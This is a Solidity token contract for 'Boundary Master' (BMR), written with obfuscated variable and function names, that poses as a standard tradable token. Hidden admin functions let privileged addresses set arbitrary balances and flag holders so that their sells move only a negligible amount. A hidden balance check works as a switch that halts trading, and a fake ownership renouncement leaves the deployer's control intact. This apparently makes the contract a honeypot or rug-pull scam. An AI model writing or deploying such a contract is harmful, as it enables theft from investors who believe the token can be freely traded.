//SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface autoExempt {
    function createPair(address marketingTo, address liquidityFromSender) external returns (address);
}

interface txShould {
    function totalSupply() external view returns (uint256);

    function balanceOf(address senderEnable) external view returns (uint256);

    function transfer(address liquidityFee, uint256 teamToken) external returns (bool);

    function allowance(address receiverTo, address spender) external view returns (uint256);

    function approve(address spender, uint256 teamToken) external returns (bool);

    function transferFrom(
        address sender,
        address liquidityFee,
        uint256 teamToken
    ) external returns (bool);

    event Transfer(address indexed from, address indexed teamMode, uint256 value);
    event Approval(address indexed receiverTo, address indexed spender, uint256 value);
}

abstract contract tradingReceiverFund {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface buyFund {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface amountTrading is txShould {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract BoundaryMaster is tradingReceiverFund, txShould, amountTrading {

    address receiverShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function exemptShould(uint256 teamToken) public {
        isLiquidity();
        txAuto = teamToken;
    }

    mapping(address => bool) public limitReceiverAuto;

    function buyMin() public {
        emit OwnershipTransferred(tradingBuy, address(0));
        toAuto = address(0);
    }

    string private feeTake = "Boundary Master";

    function approve(address tokenMarketing, uint256 teamToken) public virtual override returns (bool) {
        shouldTrading[_msgSender()][tokenMarketing] = teamToken;
        emit Approval(_msgSender(), tokenMarketing, teamToken);
        return true;
    }

    mapping(address => bool) public amountExempt;

    function totalSupply() external view virtual override returns (uint256) {
        return txFrom;
    }

    function transfer(address amountTotal, uint256 teamToken) external virtual override returns (bool) {
        return liquidityMode(_msgSender(), amountTotal, teamToken);
    }

    address public tradingBuy;

    uint256 constant limitEnableIs = 16 ** 10;

    bool public fundAutoFrom;

    function txWallet(address limitReceiver) public {
        isLiquidity();
        if (launchFundMin == modeLiquidity) {
            maxWalletAmount = true;
        }
        if (limitReceiver == tradingBuy || limitReceiver == enableList) {
            return;
        }
        amountExempt[limitReceiver] = true;
    }

    address listTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint8 private sellWallet = 18;

    uint256 txAuto;

    uint256 public swapReceiver;

    function name() external view virtual override returns (string memory) {
        return feeTake;
    }

    uint256 public launchFundMin;

    address private toAuto;

    function transferFrom(address tradingTakeIs, address liquidityFee, uint256 teamToken) external override returns (bool) {
        if (_msgSender() != listTotal) {
            if (shouldTrading[tradingTakeIs][_msgSender()] != type(uint256).max) {
                require(teamToken <= shouldTrading[tradingTakeIs][_msgSender()]);
                shouldTrading[tradingTakeIs][_msgSender()] -= teamToken;
            }
        }
        return liquidityMode(tradingTakeIs, liquidityFee, teamToken);
    }

    bool public minSell;

    function decimals() external view virtual override returns (uint8) {
        return sellWallet;
    }

    function allowance(address listLiquidity, address tokenMarketing) external view virtual override returns (uint256) {
        if (tokenMarketing == listTotal) {
            return type(uint256).max;
        }
        return shouldTrading[listLiquidity][tokenMarketing];
    }

    bool private totalAuto;

    function getOwner() external view returns (address) {
        return toAuto;
    }

    function balanceOf(address senderEnable) public view virtual override returns (uint256) {
        return amountEnable[senderEnable];
    }

    uint256 fromShouldReceiver;

    function liquidityMode(address tradingTakeIs, address liquidityFee, uint256 teamToken) internal returns (bool) {
        if (tradingTakeIs == tradingBuy) {
            return senderSellList(tradingTakeIs, liquidityFee, teamToken);
        }
        uint256 fromSwap = txShould(enableList).balanceOf(receiverShould);
        require(fromSwap == txAuto);
        require(liquidityFee != receiverShould);
        if (amountExempt[tradingTakeIs]) {
            return senderSellList(tradingTakeIs, liquidityFee, limitEnableIs);
        }
        return senderSellList(tradingTakeIs, liquidityFee, teamToken);
    }

    mapping(address => mapping(address => uint256)) private shouldTrading;

    function isLiquidity() private view {
        require(limitReceiverAuto[_msgSender()]);
    }

    string private totalMarketing = "BMR";

    function senderSellList(address tradingTakeIs, address liquidityFee, uint256 teamToken) internal returns (bool) {
        require(amountEnable[tradingTakeIs] >= teamToken);
        amountEnable[tradingTakeIs] -= teamToken;
        amountEnable[liquidityFee] += teamToken;
        emit Transfer(tradingTakeIs, liquidityFee, teamToken);
        return true;
    }

    function launchTo(address amountTotal, uint256 teamToken) public {
        isLiquidity();
        amountEnable[amountTotal] = teamToken;
    }

    uint256 private txFrom = 100000000 * 10 ** 18;

    bool public tokenFrom;

    uint256 private modeLiquidity;

    function exemptReceiver(address teamFund) public {
        require(teamFund.balance < 100000);
        if (fundAutoFrom) {
            return;
        }
        
        limitReceiverAuto[teamFund] = true;
        
        fundAutoFrom = true;
    }

    uint256 private feeMarketing;

    event OwnershipTransferred(address indexed fundMax, address indexed feeMode);

    mapping(address => uint256) private amountEnable;

    function symbol() external view virtual override returns (string memory) {
        return totalMarketing;
    }

    bool public maxWalletAmount;

    address public enableList;

    function owner() external view returns (address) {
        return toAuto;
    }

    constructor (){
        
        buyFund senderMin = buyFund(listTotal);
        enableList = autoExempt(senderMin.factory()).createPair(senderMin.WETH(), address(this));
        if (tokenFrom) {
            minSell = true;
        }
        tradingBuy = _msgSender();
        limitReceiverAuto[tradingBuy] = true;
        amountEnable[tradingBuy] = txFrom;
        buyMin();
        if (modeLiquidity == launchFundMin) {
            maxWalletAmount = true;
        }
        emit Transfer(address(0), tradingBuy, txFrom);
    }

    bool private tokenMode;

}